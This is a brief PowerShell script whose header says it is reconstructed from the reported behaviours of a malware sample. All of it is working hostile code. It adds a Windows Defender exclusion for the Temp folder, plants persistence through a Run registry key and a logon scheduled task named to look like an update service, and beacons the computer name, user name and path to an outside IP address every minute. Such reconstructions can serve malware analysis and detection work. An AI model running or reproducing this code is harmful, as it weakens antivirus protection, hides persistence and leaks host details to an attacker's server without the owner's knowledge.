# Reconstructed from reported behaviors; not recovered original bytes.
Add-MpPreference -ExclusionPath 'C:\Windows\Temp'
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdSvc2' -Value 'C:\Windows\Temp\WinUpdSvc2.exe' -PropertyType String -Force
schtasks /Create /TN WinUpdSvc2 /TR 'C:\Windows\Temp\WinUpdSvc2.exe' /SC ONLOGON /F
while ($true) {
    $client = New-Object System.Net.Sockets.TcpClient('45.92.111.116',8443)
    $stream = $client.GetStream()
    $record = "BEACON|$env:COMPUTERNAME|$env:USERNAME|$PWD"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($record)
    $stream.Write($bytes,0,$bytes.Length)
    $client.Close()
    Start-Sleep -Seconds 60
}
